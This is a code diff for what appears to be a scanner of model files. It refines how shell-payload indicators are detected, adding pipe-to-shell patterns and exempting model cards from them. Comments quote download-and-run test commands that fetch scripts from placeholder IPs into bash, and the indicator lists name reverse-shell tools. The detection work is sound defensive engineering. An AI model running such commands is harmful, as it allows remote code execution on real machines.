@@ -129,6 +129,18 @@ var cardExcluded = map[*report.Rule]bool{
 	ruleCredential:   true,
 }
 
+// cardExcludedKinds leaves one indicator *family* out of a card rather than a
+// whole rule: the download-and-run pipe.
+//
+// "Install it with curl … | bash" is how a project documents an installer, and the
+// rule cannot tell that from a payload — the bytes are identical. Measured on the
+// top25-trending corpus: mistralai/Mistral-Large-4-1T-A52B's README renders
+// `curl -LsSf https://mistral.ai/vibe/install.sh | bash` in its Installation
+// section, and the composed pipe turned that into the corpus's only new high
+// finding. A card is documentation; the same string in a metadata value, a config,
+// a pickle or a template is still a payload and still reported.
+var cardExcludedKinds = map[string]bool{"pipe-to-shell": true}
+
 func tierOf(r *report.Rule) tier {
 	if t, ok := ruleTiers[r]; ok {
 		return t
@@ -148,7 +160,7 @@ func (k Kind) allows(h Hit) bool {
 	case KindTemplate:
 		return h.Rule != ruleInjection
 	case KindCard:
-		return !cardExcluded[h.Rule]
+		return !cardExcluded[h.Rule] && !cardExcludedKinds[h.Extra["kind"]]
 	default:
 		return true
 	}
@@ -452,7 +464,6 @@ func buildIndicatorTable() []indicator {
 	add(
 		ruleShell, "shell-payload", false,
 		"bash -i", "sh -i", "/bin/sh -c", "/bin/bash -c", "bash -c",
-		"curl | sh", "wget -qO-",
 		"nc -e", "ncat -e", "socat exec:", "/dev/tcp/",
 		"powershell -e", "powershell -enc", "cmd.exe /c", "certutil -urlcache",
 		"reverse shell",
@@ -461,6 +472,23 @@ func buildIndicatorTable() []indicator {
 		ruleShell, "shell-payload",
 		"mkfifo", "chmod +x", "base64 -d", "base64 --decode", "whoami",
 		"python -c", "perl -e", "ruby -e",
+	)
+
+	// A pipe into an interpreter is the second half of a download-and-run chain,
+	// and on its own it is a Markdown table cell ("| sh | notes |"). The
+	// composition is checked in dropUncomposedPipes: the hit survives only when a
+	// download source (curl, wget, an http(s) URL) precedes the pipe in the same
+	// buffer.
+	//
+	// This replaces the literal "curl | sh", which only matched the spelling with
+	// no arguments between the command and the pipe — that is, no real payload.
+	// Measured on the validity-oracle lab's metadata row: `curl -fsSL
+	// http://198.51.100.7/x.sh | bash` and `curl -s http://198.51.100.9/x | sh`
+	// both reported only SC4N-STRING-RAW-IP-URL.
+	add(
+		ruleShell, "pipe-to-shell", false,
+		"| sh", "| bash", "| zsh", "| dash", "| python", "| python3", "| perl", "| ruby",
+		"|sh", "|bash", "|zsh",
 	)
 
 	// Decoder calls: a data string that names one is a step in an obfuscation
